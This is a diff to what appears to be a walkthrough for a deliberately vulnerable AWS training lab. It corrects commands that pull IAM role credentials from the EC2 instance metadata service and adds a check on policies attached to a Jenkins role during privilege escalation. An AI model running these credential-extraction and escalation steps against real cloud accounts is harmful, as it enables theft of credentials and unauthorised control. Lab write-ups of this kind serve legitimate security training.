@@ -245,7 +245,7 @@ Now we have a shell on a second machine. Time to escalate further!
 From the new EC2 instance, repeat the credential extraction process:
 ```bash
 TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
-echo $TOKEN
+ROLE_NAME=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
 curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME
 ```
 ![image](https://github.com/user-attachments/assets/b0f2e89b-5297-4530-802b-ad7765f8f247)
@@ -269,6 +269,7 @@ aws iam attach-role-policy --role-name hrgoat-jenkins-role --policy-arn arn:aws:
 
 Check if it worked:
 ```bash
+aws iam list-attached-role-policies --role-name hrgoat-jenkins-role
 aws iam list-users
 ```
 ![image](https://github.com/user-attachments/assets/dbb2a40f-ea9c-4cd3-86ab-ba110ecc8b8b)
